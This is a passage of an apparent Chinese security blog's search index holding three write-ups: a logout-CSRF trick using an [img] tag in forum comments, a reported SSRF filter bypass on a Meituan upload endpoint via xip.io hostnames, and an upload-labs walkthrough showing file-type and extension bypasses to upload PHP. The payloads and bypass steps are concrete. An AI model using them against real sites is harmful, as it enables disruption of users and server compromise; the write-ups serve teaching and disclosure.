<code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code></p><p><img src="http://static.zybuluo.com/1kbfree/v8ky2tc30m99log7jrih4khx/image_1co8rlknh1bi6i131rafr51nbf8f.png" alt="image_1co8rlknh1bi6i131rafr51nbf8f.png-100.1kB"></p><p>可以看到加载了，那么刷新一下~</p><p><img src="http://static.zybuluo.com/1kbfree/uz3q9onxmdllqfac4gpwwmam/image_1co8rm7751lfi16hb10e31151rae8s.png" alt="image_1co8rm7751lfi16hb10e31151rae8s.png-81.3kB"></p><p>那么，我如果想恶意破坏的话，我可以在每个文章那里加上这个代码（评论），导致每个看文章的人无法正常访问I春秋~~</p><h3 id="漏洞案例复现"><a href="#漏洞案例复现" class="headerlink" title="漏洞案例复现"></a>漏洞案例复现</h3><p>利用条件：</p><p>1、退出的Url没有Token等验证<br>2、可以有<code>&lt;img&gt;</code>或者其他加载资源的标签</p><p>首先，知道某网站的退出链接是<code>http://www.xxx.com/exit</code>。</p><p>那么我们可以去找到论坛留言处、头像处、背景图片处将Url设置为<code>http://www.xxx.com/exit</code>，那么当用户每次访问的时候都会退出。如下是一个漏洞案例</p><p>1、打开Url：<a href="http://xxxxxx/forum.php?id=马赛克" target="_blank" rel="noopener">http://xxxxxx/forum.php?id=马赛克</a> （随便找的一个帖子），然后评论一下，并且抓包加入恶意代码，如下</p><p><img src="http://static.zybuluo.com/1kbfree/mzs2zy1p11g46343mj011xre/image_1cqbpd8e23mnkej99cnep1cro9.png" alt=""></p><p>加入的代码是 <code>[img]http://xxxxxx/logout?client_id=1[/img]</code></p><p>2、然后打开帖子</p><p><img src="http://static.zybuluo.com/1kbfree/ls8y940ot3y8lanz0b9v7u7m/image_1cqbpfvh81qrm1lne1tbo1iou16qm.png" alt=""></p><p><img src="http://static.zybuluo.com/1kbfree/vogapad0mu7bdhkmk0zpywab/image_1cqbpif0ptjk1p5d1tqp8slj0j13.png" alt=""></p><p>可以看到已经退出了~</p><p>利用思路</p><p>上面是一个利用思路，但是这个只是评论处的利用，其实还有很多可以，如下几列</p><p>1、可以利用Csrf漏洞结合，把头像、个人背景等img的地址修改为退出url<br>2、利用越权改头像把图片地址改成退出地址，然后其他用户一登录就退出，增加危害~<br>3、有些网站聊天处可以发图片，那么可以发送一个退出Url给他，导致退出（单次的，低危害） </p><h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>1、有个<code>get</code>请求的<code>csrf</code>，但是严格的验证了<code>referer</code>为<code>www.a.com</code>，那么可以在<code>www.a.com</code>中插入一个外链，然后把外链地址改为<code>get</code>请求的<code>csrf</code>地址，就可以绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美团某处上传存在SSRF漏洞</title>
      <link href="/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/"/>
      <url>/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>1、打开Url：<a href="http://xxx.com/profile" target="_blank" rel="noopener">http://xxx.com/profile</a> ，然后选择一个图片上传然后抓包发现有如下请求</p><p><img src="http://static.zybuluo.com/1kbfree/27tbui8q7e9x7ravx8jivzdk/1.png" alt="1.png-220kB"></p><p>然后我猜想这里的处理流程是这样的：</p><ol><li>上传文件后返回包返回一个<code>Url</code></li><li>然后上图那个请求把一部的<code>Url</code>去访问并且使其成为图片地址（应该是读取<code>Url</code>然后把它内容写入~）</li></ol><p>那么以上流程如果<code>Url</code>没有严格过滤的话是会造成<code>SSRF</code>的，但是这里有过滤，但仍可以绕过~</p><pre><code>http://p1.meituan.net.127.0.0.1.xip.io</code></pre><p>上面这个<code>url</code>打开等于打开<code>127.0.0.1</code>（<code>ping</code>一下就知道了）</p><p><img src="http://static.zybuluo.com/1kbfree/n4bivtodu7857uam9n5yh55x/1.png" alt="1.png-24.5kB"></p><p>这里去请求一下我的<code>ceye</code>（和<code>dnslog</code>一样的）</p><p><img src="http://static.zybuluo.com/1kbfree/d3m6dlql5t7zg646b6chlcmv/1.png" alt="1.png-232.5kB"></p><p>然后去我的<code>CEYE</code>去看下~</p><p><img src="http://static.zybuluo.com/1kbfree/t1ejl7jg1dimuvvkr8fx0fwb/image.png" alt="image.png-110.8kB"></p><p>可以看到他这里是有去请求的，那么还可以利用<code>CEYE</code>的<code>DNS Rebinding</code>使其去访问一个<code>ip</code>（比较麻烦），所以这里用另一种方法来使其访问随意一个<code>ip</code></p><pre><code>http://p1.meituan.net.183.232.231.172.xip.io/</code></pre><p>这里的<code>183.232.231.172</code>是我<code>ping</code>百度的<code>ip</code>，然后我打开一下看看~</p><p><img src="http://static.zybuluo.com/1kbfree/lz0psyxavxnf65hxnnclmgv6/1.png" alt="1.png-32.9kB"></p><p>然后放入请求中是可以正常访问的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/yakvfdjz5uwlo28t22u6545v/1.png" alt="1.png-234.5kB"></p><p>那么再测试一个无法访问的<code>ip</code>试试</p><p><img src="http://static.zybuluo.com/1kbfree/q6qy5t0ntzztbjpmlh6sq0p5/1.png" alt="1.png-254.4kB"></p><p>可以看到返回的是<code>504</code>而且请求时间非常的长~ </p><p>下面探测内网的就不展示了。</p><h3 id="漏洞进展"><a href="#漏洞进展" class="headerlink" title="漏洞进展"></a>漏洞进展</h3><p>评级：中<br>奖金：250</p><blockquote><p>因为非核心业务所以给的钱比较少</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2018/12/23/ce-shi/"/>
      <url>/2018/12/23/ce-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>这是一个文件上传的靶场（总共19关）</p><p>下载地址：<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>第一关：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/dfxzko0fx07b0zzwhs8b9rc5/image.png" alt="image.png-194.5kB"></p><p>可以看到这里的上传的验证是<code>javascript</code>验证的，也就是前台认证，但是我们可以利用后台验证绕过。</p><p>步骤：<br>1、上传一个<code>2.png</code><br>2、抓包将<code>2.png</code>修改为<code>2.php</code></p><p><img src="http://static.zybuluo.com/1kbfree/7i5cct348yr73j5bb5lvq83o/1.png" alt="1.png-225.3kB"></p><p>然后看看是否成功上传</p><p><img src="http://static.zybuluo.com/1kbfree/yalbi6a2hqg1edk2av1g1irf/1.png" alt="1.png-16.1kB"></p><blockquote><p><code>upload</code>目录是这个靶机上传的文件的存放目录，所以上传的东西都会在这里，所以看有没有成功上传的话可以直接来这里看，或者去访问一下<code>http://xxx.xxx.xxx/upload/文件名</code>，如我刚刚上传的<code>2.php</code>就是这个链接</p></blockquote><p><a href="http://127.0.0.1/upload/upload/2.php" target="_blank" rel="noopener">http://127.0.0.1/upload/upload/2.php</a></p><p><img src="http://static.zybuluo.com/1kbfree/angm6k565a0a80yb92s88aag/1.png" alt="1.png-51.8kB"></p><p><strong>第二关：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/tqnbqfhzv9lwkw5czg14ww0r/1.png" alt="1.png-256kB"></p><p>所谓文件类型就是上传文件的时候请求中的<code>Content-Type</code>，如下</p><p><img src="http://static.zybuluo.com/1kbfree/l3to2zba83jvgqcwo4qd29m9/1.png" alt="1.png-206.5kB"></p><p>这关的代码逻辑就是，如果上传的文件类型是<code>image/jpeg</code>或<code>image/png</code>或<code>image/gif</code>就可以上传。那么只要上传一个<code>php</code>文件，然后把文件类型修改为<code>image/jpeg</code>即可上传</p><p><img src="http://static.zybuluo.com/1kbfree/xjeoam8717exn8g2d242f27c/1.png" alt="1.png-132.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/reje45f4tr5e91y6l1wnxwtk/1.png" alt="1.png-30.6kB"></p><p>成功上传~</p><p><strong>第三关：</strong></p><blockquote><p>此关就是后台禁止<code>php</code>、<code>jsp</code>、<code>asp</code>、<code>aspx</code>这四个文件上传</p></blockquote><p>这关的代码比较长，我就直接贴出来了~</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.asp'</span><span class="token punctuation">,</span><span class="token string">'.aspx'</span><span class="token punctuation">,</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取文件名的后缀（就是获取.后面的内容）</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 如果$file_ext的值不在$deny_ext列表里，即进入条件</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>既然不能上传<code>php</code>，那么我们可以上传<code>.php3</code>（上传后也是当<code>php</code>解析）</p><p><img src="http://static.zybuluo.com/1kbfree/gklph1wdj0vfabm9i2z7w1ba/1.png" alt="1.png-135.2kB"></p><p>然后看看是否上传了</p><p><img src="http://static.zybuluo.com/1kbfree/f9jc8iu3bedg49usjc4tipvg/1.png" alt="1.png-25.3kB"></p><p>可以看到是上传了的，但是为什么名字会那么长呢？<br>可以看看代码中第<code>15</code>行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><p>这个<code>$img_path</code>就是上传后的文件的地址，<code>UPDATE_PATH</code>就是上传目录(<code>upload</code>)，<code>data(&quot;YmdHis&quot;)</code>就是当前时间的年月日时分秒，<code>rand(1000,9999)</code>就是在<code>0000</code>到<code>9999</code>中随机抽数字，<code>$file_ext</code>就是上传的文件的后缀，所以拼接起来就是这么长的名字。</p><p>那么我们上传了这个文件后，看不到他的名字，我们就可以爆破当前时间的年月日时分秒，然后后面几个随机数字爆破，这里不演示了，直接打开看看<code>php3</code>是否和<code>php</code>效果一样~</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
